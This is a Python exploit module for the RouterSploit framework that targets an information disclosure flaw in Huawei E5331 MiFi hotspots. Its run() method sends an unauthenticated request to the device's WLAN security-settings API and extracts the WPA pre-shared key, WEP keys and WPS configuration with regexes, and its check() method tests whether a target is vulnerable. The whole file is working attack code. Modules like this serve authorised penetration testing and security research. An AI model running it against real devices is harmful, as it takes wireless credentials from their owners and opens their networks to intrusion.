import re

from routersploit import (
    exploits,
    print_success,
    print_table,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Huawei E5331 Information Disclosure vulnerability.
    If the target is vulnerable it allows to read sensitive information."
    """
    __info__ = {
        'name': 'Huawei E5331 Info Disclosure',
        'description': 'Module exploits information disclosure vulnerability in Huawei E5331 MiFi Mobile Hotspot'
                       'devices. If the target is vulnerable it allows to read sensitive information.',
        'authors': [
            'J. Greil https://www.sec-consult.com',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/32161/',
        ],
        'devices': [
            'Huawei E5331 MiFi Mobile Hotspot',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port

    opts = ['WifiAuthmode', 'WifiBasicencryptionmodes', 'WifiWpaencryptionmodes', 'WifiWepKey1', 'WifiWepKey2',
            'WifiWepKey3', 'WifiWepKey4', 'WifiWepKeyIndex', 'WifiWpapsk', 'WifiWpsenbl', 'WifiWpscfg', 'WifiRestart']

    def run(self):
        url = "{}:{}/api/wlan/security-settings".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        res = []
        for option in self.opts:
            regexp = "<{}>(.+?)</{}>".format(option, option)
            value = re.findall(regexp, response.text)
            if value:
                res.append((option, value[0]))

        if len(res):
            print_success("Found sensitive information!")
            print_table(("Option", "Value"), *res)

    @mute
    def check(self):
        url = "{}:{}/api/wlan/security-settings".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        res = []
        for option in self.opts:
            regexp = "<{}>(.+?)</{}>".format(option, option)
            value = re.findall(regexp, response.text)
            if value:
                res.append(value)

        if len(res):
            return True  # target is vulnerable

        return False  # target is not vulnerable
